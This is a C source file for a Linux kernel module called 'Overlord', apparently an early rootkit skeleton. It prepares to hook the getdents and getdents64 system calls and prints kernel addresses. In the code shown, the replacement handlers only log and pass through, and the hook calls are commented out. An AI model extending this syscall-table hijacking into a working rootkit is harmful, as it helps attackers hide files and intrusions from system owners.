#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/linkage.h>
#include <linux/unistd.h>

#include <linux/dirent.h>
#include <linux/syscalls.h>

#include "syscall.h"

MODULE_LICENSE("GPL"); // nt torvalds

typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
    printk(KERN_INFO "[Overlord] getdents hacked!");
    return ((orig_getdents_t)orig_syscall(__NR_getdents))(fd, dirent, count);
}

typedef asmlinkage int (*orig_getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    printk(KERN_INFO "[Overlord] getdents64 hacked!");
    return ((orig_getdents64_t)orig_syscall(__NR_getdents64))(fd, dirent, count);
}

static int __init overlord_init(void) {
    syscall_setup();
    printk(KERN_INFO "[Overlord]: Ours: %px\n", &hacked_getdents64);
    printk(KERN_INFO "[Overlord]: Orig: %px\n", (void*)orig_syscall(__NR_getdents64));
    printk(KERN_INFO "[Overlord]: Hello World!\n");
    //hook_syscall(&hacked_getdents, __NR_getdents);
    //hook_syscall(&hacked_getdents64, __NR_getdents64);
    return 0;
}

static void __exit overlord_exit(void) {
    syscall_rollback();
    printk(KERN_INFO "[Overlord]: Goodbye World!\n");
}

module_init(overlord_init);
module_exit(overlord_exit);
